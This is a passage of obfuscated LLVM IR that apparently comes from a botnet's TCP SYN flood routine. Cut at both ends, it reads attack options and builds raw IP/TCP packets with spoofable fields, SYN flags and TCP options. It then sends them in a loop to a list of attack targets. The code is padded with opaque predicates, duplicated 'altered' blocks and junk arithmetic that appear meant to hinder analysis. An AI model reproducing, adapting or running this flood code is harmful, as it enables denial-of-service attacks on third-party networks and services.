  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  %539 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 6
  store i16 0, i16* %540, align 4
  %541 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %542 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %543 = bitcast %struct.tcphdr* %542 to i8*
  %544 = call zeroext i16 @htons(i16 zeroext 40) #7
  %545 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %541, i8* %543, i16 zeroext %544, i32 40)
  %546 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 6
  store i16 %545, i16* %547, align 4
  %548 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %549 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %548, i32 0, i32 1
  %550 = load i16, i16* %549, align 2
  %551 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %552 = load i32, i32* %19, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %551, i64 %553
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %554, i32 0, i32 0
  %556 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %555, i32 0, i32 1
  store i16 %550, i16* %556, align 2
  %557 = load i32, i32* %20, align 4
  %558 = load i8*, i8** %41, align 8
  %559 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %560 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %561 = load i32, i32* %19, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %560, i64 %562
  %564 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %563, i32 0, i32 0
  %565 = bitcast %struct.sockaddr_in* %564 to %struct.sockaddr*
  store %struct.sockaddr* %565, %struct.sockaddr** %559, align 8
  %566 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %567 = load %struct.sockaddr*, %struct.sockaddr** %566, align 8
  %568 = call i64 @sendto(i32 %557, i8* %558, i64 60, i32 16384, %struct.sockaddr* %567, i32 16)
  br label %569

; <label>:569:                                    ; preds = %531
  %570 = load i32, i32* %19, align 4
  %571 = add nsw i32 %570, 1
  store i32 %571, i32* %19, align 4
  br label %410

; <label>:572:                                    ; preds = %410
  %573 = load i32, i32* @x.23
  %574 = load i32, i32* @y.24
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB255, label %originalBB255alteredBB

originalBB255:                                    ; preds = %originalBB255alteredBB, %572
  %581 = call i64 @time(i64* null) #6
  %582 = load i32, i32* %37, align 4
  %583 = sext i32 %582 to i64
  %584 = icmp sgt i64 %581, %583
  %585 = load i32, i32* @x.23
  %586 = load i32, i32* @y.24
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart2257, label %originalBB255alteredBB

originalBBpart2257:                               ; preds = %originalBB255
  br i1 %584, label %593, label %594

; <label>:593:                                    ; preds = %originalBBpart2257
  br label %611

; <label>:594:                                    ; preds = %originalBBpart2257
  %595 = load i32, i32* @x.23
  %596 = load i32, i32* @y.24
  %597 = sub i32 %595, 1
  %598 = mul i32 %595, %597
  %599 = urem i32 %598, 2
  %600 = icmp eq i32 %599, 0
  %601 = icmp slt i32 %596, 10
  %602 = or i1 %600, %601
  br i1 %602, label %originalBB259, label %originalBB259alteredBB

originalBB259:                                    ; preds = %originalBB259alteredBB, %594
  %603 = load i32, i32* @x.23
  %604 = load i32, i32* @y.24
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBBpart2261, label %originalBB259alteredBB

originalBBpart2261:                               ; preds = %originalBB259
  br label %393

; <label>:611:                                    ; preds = %593, %originalBBpart24, %122
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %612 = alloca i32, align 4
  %613 = alloca i8, align 1
  %614 = alloca %struct.attack_target*, align 8
  %615 = alloca i8, align 1
  %616 = alloca %struct.attack_option*, align 8
  %617 = alloca i32, align 4
  %618 = alloca i32, align 4
  %619 = alloca i8**, align 8
  %620 = alloca i8, align 1
  %621 = alloca i16, align 2
  %622 = alloca i8, align 1
  %623 = alloca i8, align 1
  %624 = alloca i16, align 2
  %625 = alloca i16, align 2
  %626 = alloca i32, align 4
  %627 = alloca i32, align 4
  %628 = alloca i8, align 1
  %629 = alloca i8, align 1
  %630 = alloca i8, align 1
  %631 = alloca i8, align 1
  %632 = alloca i8, align 1
  %633 = alloca i8, align 1
  %634 = alloca i32, align 4
  %635 = alloca i32, align 4
  %636 = alloca %struct.iphdr*, align 8
  %637 = alloca %struct.tcphdr*, align 8
  %638 = alloca i8*, align 8
  %639 = alloca i8*, align 8
  %640 = alloca %struct.iphdr*, align 8
  %641 = alloca %struct.tcphdr*, align 8
  %642 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %612, align 4
  store i8 %1, i8* %613, align 1
  store %struct.attack_target* %2, %struct.attack_target** %614, align 8
  store i8 %3, i8* %615, align 1
  store %struct.attack_option* %4, %struct.attack_option** %616, align 8
  store i32 0, i32* %617, align 4
  store i32 0, i32* %618, align 4
  %643 = load i8, i8* %613, align 1
  %644 = zext i8 %643 to i64
  %645 = call noalias i8* @calloc(i64 %644, i64 8) #6
  %646 = bitcast i8* %645 to i8**
  store i8** %646, i8*** %619, align 8
  %647 = load i8, i8* %615, align 1
  %648 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %649 = call i32 @attack_get_opt_int(i8 zeroext %647, %struct.attack_option* %648, i8 zeroext 2, i32 0)
  %650 = trunc i32 %649 to i8
  store i8 %650, i8* %620, align 1
  %651 = load i8, i8* %615, align 1
  %652 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %653 = call i32 @attack_get_opt_int(i8 zeroext %651, %struct.attack_option* %652, i8 zeroext 3, i32 65535)
  %654 = trunc i32 %653 to i16
  store i16 %654, i16* %621, align 2
  %655 = load i8, i8* %615, align 1
  %656 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %657 = call i32 @attack_get_opt_int(i8 zeroext %655, %struct.attack_option* %656, i8 zeroext 4, i32 64)
  %658 = trunc i32 %657 to i8
  store i8 %658, i8* %622, align 1
  %659 = load i8, i8* %615, align 1
  %660 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %661 = call i32 @attack_get_opt_int(i8 zeroext %659, %struct.attack_option* %660, i8 zeroext 5, i32 1)
  %662 = trunc i32 %661 to i8
  store i8 %662, i8* %623, align 1
  %663 = load i8, i8* %615, align 1
  %664 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %665 = call i32 @attack_get_opt_int(i8 zeroext %663, %struct.attack_option* %664, i8 zeroext 6, i32 65535)
  %666 = trunc i32 %665 to i16
  store i16 %666, i16* %624, align 2
  %667 = load i8, i8* %615, align 1
  %668 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %669 = call i32 @attack_get_opt_int(i8 zeroext %667, %struct.attack_option* %668, i8 zeroext 7, i32 65535)
  %670 = trunc i32 %669 to i16
  store i16 %670, i16* %625, align 2
  %671 = load i8, i8* %615, align 1
  %672 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %673 = call i32 @attack_get_opt_int(i8 zeroext %671, %struct.attack_option* %672, i8 zeroext 16, i32 65535)
  store i32 %673, i32* %626, align 4
  %674 = load i8, i8* %615, align 1
  %675 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %676 = call i32 @attack_get_opt_int(i8 zeroext %674, %struct.attack_option* %675, i8 zeroext 17, i32 0)
  store i32 %676, i32* %627, align 4
  %677 = load i8, i8* %615, align 1
  %678 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %679 = call i32 @attack_get_opt_int(i8 zeroext %677, %struct.attack_option* %678, i8 zeroext 10, i32 0)
  %680 = trunc i32 %679 to i8
  store i8 %680, i8* %628, align 1
  %681 = load i8, i8* %615, align 1
  %682 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %683 = call i32 @attack_get_opt_int(i8 zeroext %681, %struct.attack_option* %682, i8 zeroext 11, i32 0)
  %684 = trunc i32 %683 to i8
  store i8 %684, i8* %629, align 1
  %685 = load i8, i8* %615, align 1
  %686 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %687 = call i32 @attack_get_opt_int(i8 zeroext %685, %struct.attack_option* %686, i8 zeroext 12, i32 0)
  %688 = trunc i32 %687 to i8
  store i8 %688, i8* %630, align 1
  %689 = load i8, i8* %615, align 1
  %690 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %691 = call i32 @attack_get_opt_int(i8 zeroext %689, %struct.attack_option* %690, i8 zeroext 13, i32 0)
  %692 = trunc i32 %691 to i8
  store i8 %692, i8* %631, align 1
  %693 = load i8, i8* %615, align 1
  %694 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %695 = call i32 @attack_get_opt_int(i8 zeroext %693, %struct.attack_option* %694, i8 zeroext 14, i32 1)
  %696 = trunc i32 %695 to i8
  store i8 %696, i8* %632, align 1
  %697 = load i8, i8* %615, align 1
  %698 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %699 = call i32 @attack_get_opt_int(i8 zeroext %697, %struct.attack_option* %698, i8 zeroext 15, i32 0)
  %700 = trunc i32 %699 to i8
  store i8 %700, i8* %633, align 1
  %701 = load i8, i8* %615, align 1
  %702 = load %struct.attack_option*, %struct.attack_option** %616, align 8
  %703 = load i32, i32* @LOCAL_ADDR, align 4
  %704 = call i32 @attack_get_opt_ip(i8 zeroext %701, %struct.attack_option* %702, i8 zeroext 19, i32 %703)
  store i32 %704, i32* %634, align 4
  %705 = call i64 @time(i64* null) #6
  %706 = load i32, i32* %612, align 4
  %707 = sext i32 %706 to i64
  %_ = sub i64 %705, %707
  %gen = mul i64 %_, %707
  %_1 = shl i64 %705, %707
  %708 = add nsw i64 %705, %707
  %709 = trunc i64 %708 to i32
  store i32 %709, i32* %635, align 4
  %710 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %710, i32* %618, align 4
  %711 = icmp eq i32 %710, -1
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %128
  %712 = load i32, i32* %20, align 4
  %713 = call i32 @close(i32 %712)
  br label %originalBB2

originalBB6alteredBB:                             ; preds = %originalBB6, %153
  %714 = call noalias i8* @calloc(i64 128, i64 1) #6
  %715 = load i8**, i8*** %21, align 8
  %716 = load i32, i32* %19, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds i8*, i8** %715, i64 %717
  store i8* %714, i8** %718, align 8
  %719 = load i8**, i8*** %21, align 8
  %720 = load i32, i32* %19, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds i8*, i8** %719, i64 %721
  %723 = load i8*, i8** %722, align 8
  %724 = bitcast i8* %723 to %struct.iphdr*
  store %struct.iphdr* %724, %struct.iphdr** %38, align 8
  %725 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %726 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %725, i64 1
  %727 = bitcast %struct.iphdr* %726 to %struct.tcphdr*
  store %struct.tcphdr* %727, %struct.tcphdr** %39, align 8
  %728 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %729 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %728, i64 1
  %730 = bitcast %struct.tcphdr* %729 to i8*
  store i8* %730, i8** %40, align 8
  %731 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %732 = bitcast %struct.iphdr* %731 to i8*
  %733 = load i8, i8* %732, align 4
  %_7 = sub i8 %733, 15
  %gen8 = mul i8 %_7, 15
  %_9 = sub i8 0, %733
  %gen10 = add i8 %_9, 15
  %_11 = shl i8 %733, 15
  %_12 = sub i8 %733, 15
  %gen13 = mul i8 %_12, 15
  %_14 = shl i8 %733, 15
  %734 = and i8 %733, 15
  %_15 = sub i8 %734, 64
  %gen16 = mul i8 %_15, 64
  %_17 = sub i8 0, %734
  %gen18 = add i8 %_17, 64
  %_19 = shl i8 %734, 64
  %_20 = sub i8 %734, 64
  %gen21 = mul i8 %_20, 64
  %_22 = sub i8 %734, 64
  %gen23 = mul i8 %_22, 64
  %_24 = sub i8 %734, 64
  %gen25 = mul i8 %_24, 64
  %735 = or i8 %734, 64
  store i8 %735, i8* %732, align 4
  %736 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %737 = bitcast %struct.iphdr* %736 to i8*
  %738 = load i8, i8* %737, align 4
  %_26 = shl i8 %738, -16
  %_27 = shl i8 %738, -16
  %_28 = shl i8 %738, -16
  %739 = and i8 %738, -16
  %_29 = sub i8 0, %739
  %gen30 = add i8 %_29, 5
  %_31 = sub i8 0, %739
  %gen32 = add i8 %_31, 5
  %_33 = sub i8 %739, 5
  %gen34 = mul i8 %_33, 5
  %740 = or i8 %739, 5
  store i8 %740, i8* %737, align 4
  %741 = load i8, i8* %22, align 1
  %742 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %743 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %742, i32 0, i32 1
  store i8 %741, i8* %743, align 1
  %744 = call zeroext i16 @htons(i16 zeroext 60) #7
  %745 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %746 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %745, i32 0, i32 2
  store i16 %744, i16* %746, align 2
  %747 = load i16, i16* %23, align 2
  %748 = call zeroext i16 @htons(i16 zeroext %747) #7
  %749 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %750 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %749, i32 0, i32 3
  store i16 %748, i16* %750, align 4
  %751 = load i8, i8* %24, align 1
  %752 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %753 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %752, i32 0, i32 5
  store i8 %751, i8* %753, align 4
  %754 = load i8, i8* %25, align 1
  %755 = icmp ne i8 %754, 0
  br label %originalBB6

originalBB38alteredBB:                            ; preds = %originalBB38, %216
  %756 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %757 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %756, i32 0, i32 6
  store i8 6, i8* %757, align 1
  %758 = load i32, i32* %36, align 4
  %759 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %760 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %759, i32 0, i32 8
  store i32 %758, i32* %760, align 4
  %761 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %762 = load i32, i32* %19, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %761, i64 %763
  %765 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %764, i32 0, i32 1
  %766 = load i32, i32* %765, align 4
  %767 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %768 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %767, i32 0, i32 9
  store i32 %766, i32* %768, align 4
  %769 = load i16, i16* %26, align 2
  %770 = call zeroext i16 @htons(i16 zeroext %769) #7
  %771 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %772 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %771, i32 0, i32 0
  store i16 %770, i16* %772, align 4
  %773 = load i16, i16* %27, align 2
  %774 = call zeroext i16 @htons(i16 zeroext %773) #7
  %775 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %776 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %775, i32 0, i32 1
  store i16 %774, i16* %776, align 2
  %777 = load i32, i32* %28, align 4
  %778 = trunc i32 %777 to i16
  %779 = call zeroext i16 @htons(i16 zeroext %778) #7
  %780 = zext i16 %779 to i32
  %781 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %782 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %781, i32 0, i32 2
  store i32 %780, i32* %782, align 4
  %783 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %784 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %783, i32 0, i32 4
  %785 = load i16, i16* %784, align 4
  %_39 = shl i16 %785, -241
  %_40 = shl i16 %785, -241
  %_41 = sub i16 %785, -241
  %gen42 = mul i16 %_41, -241
  %_43 = sub i16 0, %785
  %gen44 = add i16 %_43, -241
  %_45 = shl i16 %785, -241
  %786 = and i16 %785, -241
  %_46 = shl i16 %786, 160
  %_47 = sub i16 0, %786
  %gen48 = add i16 %_47, 160
  %_49 = shl i16 %786, 160
  %787 = or i16 %786, 160
  store i16 %787, i16* %784, align 4
  %788 = load i8, i8* %30, align 1
  %789 = sext i8 %788 to i16
  %790 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %791 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %790, i32 0, i32 4
  %792 = load i16, i16* %791, align 4
  %_50 = shl i16 %789, 1
  %_51 = shl i16 %789, 1
  %_52 = sub i16 %789, 1
  %gen53 = mul i16 %_52, 1
  %_54 = sub i16 %789, 1
  %gen55 = mul i16 %_54, 1
  %793 = and i16 %789, 1
  %794 = shl i16 %793, 13
  %_56 = shl i16 %792, -8193
  %_57 = sub i16 %792, -8193
  %gen58 = mul i16 %_57, -8193
  %795 = and i16 %792, -8193
  %_59 = sub i16 0, %795
  %gen60 = add i16 %_59, %794
  %_61 = shl i16 %795, %794
  %_62 = sub i16 0, %795
  %gen63 = add i16 %_62, %794
  %_64 = sub i16 %795, %794
  %gen65 = mul i16 %_64, %794
  %_66 = sub i16 0, %795
  %gen67 = add i16 %_66, %794
  %_68 = shl i16 %795, %794
  %_69 = sub i16 %795, %794
  %gen70 = mul i16 %_69, %794
  %796 = or i16 %795, %794
  store i16 %796, i16* %791, align 4
  %797 = load i8, i8* %31, align 1
  %798 = sext i8 %797 to i16
  %799 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %800 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %799, i32 0, i32 4
  %801 = load i16, i16* %800, align 4
  %_71 = sub i16 0, %798
  %gen72 = add i16 %_71, 1
  %_73 = sub i16 %798, 1
  %gen74 = mul i16 %_73, 1
  %_75 = sub i16 %798, 1
  %gen76 = mul i16 %_75, 1
  %_77 = shl i16 %798, 1
  %802 = and i16 %798, 1
  %_78 = shl i16 %802, 12
  %_79 = sub i16 0, %802
  %gen80 = add i16 %_79, 12
  %_81 = shl i16 %802, 12
  %_82 = sub i16 0, %802
  %gen83 = add i16 %_82, 12
  %_84 = sub i16 %802, 12
  %gen85 = mul i16 %_84, 12
  %_86 = shl i16 %802, 12
  %_87 = sub i16 0, %802
  %gen88 = add i16 %_87, 12
  %803 = shl i16 %802, 12
  %_89 = shl i16 %801, -4097
  %_90 = shl i16 %801, -4097
  %_91 = sub i16 %801, -4097
  %gen92 = mul i16 %_91, -4097
  %_93 = shl i16 %801, -4097
  %_94 = shl i16 %801, -4097
  %_95 = sub i16 %801, -4097
  %gen96 = mul i16 %_95, -4097
  %_97 = sub i16 0, %801
  %gen98 = add i16 %_97, -4097
  %_99 = sub i16 %801, -4097
  %gen100 = mul i16 %_99, -4097
  %_101 = sub i16 %801, -4097
  %gen102 = mul i16 %_101, -4097
  %804 = and i16 %801, -4097
  %_103 = sub i16 0, %804
  %gen104 = add i16 %_103, %803
  %805 = or i16 %804, %803
  store i16 %805, i16* %800, align 4
  %806 = load i8, i8* %32, align 1
  %807 = sext i8 %806 to i16
  %808 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %809 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %808, i32 0, i32 4
  %810 = load i16, i16* %809, align 4
  %_105 = sub i16 %807, 1
  %gen106 = mul i16 %_105, 1
  %_107 = shl i16 %807, 1
  %_108 = sub i16 %807, 1
  %gen109 = mul i16 %_108, 1
  %_110 = sub i16 %807, 1
  %gen111 = mul i16 %_110, 1
  %_112 = sub i16 %807, 1
  %gen113 = mul i16 %_112, 1
  %_114 = sub i16 0, %807
  %gen115 = add i16 %_114, 1
  %811 = and i16 %807, 1
  %_116 = shl i16 %811, 11
  %_117 = sub i16 0, %811
  %gen118 = add i16 %_117, 11
  %_119 = sub i16 0, %811
  %gen120 = add i16 %_119, 11
  %812 = shl i16 %811, 11
  %_121 = sub i16 %810, -2049
  %gen122 = mul i16 %_121, -2049
  %_123 = sub i16 %810, -2049
  %gen124 = mul i16 %_123, -2049
  %_125 = sub i16 %810, -2049
  %gen126 = mul i16 %_125, -2049
  %_127 = shl i16 %810, -2049
  %813 = and i16 %810, -2049
  %_128 = sub i16 0, %813
  %gen129 = add i16 %_128, %812
  %_130 = sub i16 %813, %812
  %gen131 = mul i16 %_130, %812
  %_132 = sub i16 %813, %812
  %gen133 = mul i16 %_132, %812
  %814 = or i16 %813, %812
  store i16 %814, i16* %809, align 4
  %815 = load i8, i8* %33, align 1
  %816 = sext i8 %815 to i16
  %817 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %818 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %817, i32 0, i32 4
  %819 = load i16, i16* %818, align 4
  %820 = and i16 %816, 1
  %_134 = sub i16 0, %820
  %gen135 = add i16 %_134, 10
  %_136 = sub i16 0, %820
  %gen137 = add i16 %_136, 10
  %_138 = sub i16 %820, 10
  %gen139 = mul i16 %_138, 10
  %_140 = sub i16 %820, 10
  %gen141 = mul i16 %_140, 10
  %821 = shl i16 %820, 10
  %_142 = shl i16 %819, -1025
  %822 = and i16 %819, -1025
  %_143 = sub i16 %822, %821
  %gen144 = mul i16 %_143, %821
  %_145 = sub i16 0, %822
  %gen146 = add i16 %_145, %821
  %_147 = sub i16 0, %822
  %gen148 = add i16 %_147, %821
  %_149 = sub i16 0, %822
  %gen150 = add i16 %_149, %821
  %_151 = shl i16 %822, %821
  %_152 = shl i16 %822, %821
  %_153 = shl i16 %822, %821
  %823 = or i16 %822, %821
  store i16 %823, i16* %818, align 4
  %824 = load i8, i8* %34, align 1
  %825 = sext i8 %824 to i16
  %826 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %827 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %826, i32 0, i32 4
  %828 = load i16, i16* %827, align 4
  %_154 = shl i16 %825, 1
  %_155 = sub i16 0, %825
  %gen156 = add i16 %_155, 1
  %_157 = shl i16 %825, 1
  %829 = and i16 %825, 1
  %_158 = sub i16 0, %829
  %gen159 = add i16 %_158, 9
  %_160 = shl i16 %829, 9
  %_161 = sub i16 %829, 9
  %gen162 = mul i16 %_161, 9
  %_163 = sub i16 0, %829
  %gen164 = add i16 %_163, 9
  %_165 = shl i16 %829, 9
  %_166 = sub i16 0, %829
  %gen167 = add i16 %_166, 9
  %_168 = sub i16 %829, 9
  %gen169 = mul i16 %_168, 9
  %_170 = shl i16 %829, 9
  %830 = shl i16 %829, 9
  %_171 = sub i16 %828, -513
  %gen172 = mul i16 %_171, -513
  %831 = and i16 %828, -513
  %_173 = sub i16 0, %831
  %gen174 = add i16 %_173, %830
  %_175 = shl i16 %831, %830
  %_176 = shl i16 %831, %830
  %_177 = sub i16 0, %831
  %gen178 = add i16 %_177, %830
  %_179 = sub i16 0, %831
  %gen180 = add i16 %_179, %830
  %_181 = sub i16 0, %831
  %gen182 = add i16 %_181, %830
  %_183 = shl i16 %831, %830
  %832 = or i16 %831, %830
  store i16 %832, i16* %827, align 4
  %833 = load i8, i8* %35, align 1
  %834 = sext i8 %833 to i16
  %835 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %836 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %835, i32 0, i32 4
  %837 = load i16, i16* %836, align 4
  %_184 = shl i16 %834, 1
  %_185 = shl i16 %834, 1
  %_186 = sub i16 0, %834
  %gen187 = add i16 %_186, 1
  %_188 = shl i16 %834, 1
  %_189 = sub i16 %834, 1
  %gen190 = mul i16 %_189, 1
  %_191 = sub i16 %834, 1
  %gen192 = mul i16 %_191, 1
  %838 = and i16 %834, 1
  %_193 = sub i16 %838, 8
  %gen194 = mul i16 %_193, 8
  %_195 = sub i16 0, %838
  %gen196 = add i16 %_195, 8
  %_197 = sub i16 0, %838
  %gen198 = add i16 %_197, 8
  %839 = shl i16 %838, 8
  %_199 = sub i16 %837, -257
  %gen200 = mul i16 %_199, -257
  %_201 = sub i16 0, %837
  %gen202 = add i16 %_201, -257
  %_203 = sub i16 %837, -257
  %gen204 = mul i16 %_203, -257
  %_205 = sub i16 %837, -257
  %gen206 = mul i16 %_205, -257
  %840 = and i16 %837, -257
  %_207 = sub i16 0, %840
  %gen208 = add i16 %_207, %839
  %_209 = sub i16 0, %840
  %gen210 = add i16 %_209, %839
  %841 = or i16 %840, %839
  store i16 %841, i16* %836, align 4
  %842 = load i8*, i8** %40, align 8
  %843 = getelementptr inbounds i8, i8* %842, i32 1
  store i8* %843, i8** %40, align 8
  store i8 2, i8* %842, align 1
  %844 = load i8*, i8** %40, align 8
  %845 = getelementptr inbounds i8, i8* %844, i32 1
  store i8* %845, i8** %40, align 8
  store i8 4, i8* %844, align 1
  %846 = call i32 @rand_next()
  %_211 = sub i32 %846, 15
  %gen212 = mul i32 %_211, 15
  %_213 = shl i32 %846, 15
  %847 = and i32 %846, 15
  %_214 = sub i32 0, 1400
  %gen215 = add i32 %_214, %847
  %_216 = sub i32 1400, %847
  %gen217 = mul i32 %_216, %847
  %_218 = sub i32 1400, %847
  %gen219 = mul i32 %_218, %847
  %_220 = shl i32 1400, %847
  %_221 = sub i32 1400, %847
  %gen222 = mul i32 %_221, %847
  %_223 = shl i32 1400, %847
  %_224 = sub i32 1400, %847
  %gen225 = mul i32 %_224, %847
  %848 = add i32 1400, %847
  %849 = trunc i32 %848 to i16
  %850 = call zeroext i16 @htons(i16 zeroext %849) #7
  %851 = load i8*, i8** %40, align 8
  %852 = bitcast i8* %851 to i16*
  store i16 %850, i16* %852, align 2
  %853 = load i8*, i8** %40, align 8
  %854 = getelementptr inbounds i8, i8* %853, i64 2
  store i8* %854, i8** %40, align 8
  %855 = load i8*, i8** %40, align 8
  %856 = getelementptr inbounds i8, i8* %855, i32 1
  store i8* %856, i8** %40, align 8
  store i8 4, i8* %855, align 1
  %857 = load i8*, i8** %40, align 8
  %858 = getelementptr inbounds i8, i8* %857, i32 1
  store i8* %858, i8** %40, align 8
  store i8 2, i8* %857, align 1
  %859 = load i8*, i8** %40, align 8
  %860 = getelementptr inbounds i8, i8* %859, i32 1
  store i8* %860, i8** %40, align 8
  store i8 8, i8* %859, align 1
  %861 = load i8*, i8** %40, align 8
  %862 = getelementptr inbounds i8, i8* %861, i32 1
  store i8* %862, i8** %40, align 8
  store i8 10, i8* %861, align 1
  %863 = call i32 @rand_next()
  %864 = load i8*, i8** %40, align 8
  %865 = bitcast i8* %864 to i32*
  store i32 %863, i32* %865, align 4
  %866 = load i8*, i8** %40, align 8
  %867 = getelementptr inbounds i8, i8* %866, i64 4
  store i8* %867, i8** %40, align 8
  %868 = load i8*, i8** %40, align 8
  %869 = bitcast i8* %868 to i32*
  store i32 0, i32* %869, align 4
  %870 = load i8*, i8** %40, align 8
  %871 = getelementptr inbounds i8, i8* %870, i64 4
  store i8* %871, i8** %40, align 8
  %872 = load i8*, i8** %40, align 8
  %873 = getelementptr inbounds i8, i8* %872, i32 1
  store i8* %873, i8** %40, align 8
  store i8 1, i8* %872, align 1
  %874 = load i8*, i8** %40, align 8
  %875 = getelementptr inbounds i8, i8* %874, i32 1
  store i8* %875, i8** %40, align 8
  store i8 3, i8* %874, align 1
  %876 = load i8*, i8** %40, align 8
  %877 = getelementptr inbounds i8, i8* %876, i32 1
  store i8* %877, i8** %40, align 8
  store i8 3, i8* %876, align 1
  %878 = load i8*, i8** %40, align 8
  %879 = getelementptr inbounds i8, i8* %878, i32 1
  store i8* %879, i8** %40, align 8
  store i8 6, i8* %878, align 1
  br label %originalBB38

originalBB229alteredBB:                           ; preds = %originalBB229, %357
  %880 = load i32, i32* %19, align 4
  %_230 = shl i32 %880, 1
  %_231 = sub i32 0, %880
  %gen232 = add i32 %_231, 1
  %_233 = sub i32 0, %880
  %gen234 = add i32 %_233, 1
  %_235 = sub i32 0, %880
  %gen236 = add i32 %_235, 1
  %_237 = shl i32 %880, 1
  %_238 = sub i32 %880, 1
  %gen239 = mul i32 %_238, 1
  %881 = add nsw i32 %880, 1
  store i32 %881, i32* %19, align 4
  br label %originalBB229

originalBB243alteredBB:                           ; preds = %originalBB243, %376
  br label %originalBB243

originalBB247alteredBB:                           ; preds = %originalBB247, %393
  store i32 0, i32* %19, align 4
  br label %originalBB247

originalBB251alteredBB:                           ; preds = %originalBB251, %458
  %882 = call i32 @rand_next()
  %883 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %884 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %883, i32 0, i32 8
  store i32 %882, i32* %884, align 4
  br label %originalBB251

originalBB255alteredBB:                           ; preds = %originalBB255, %572
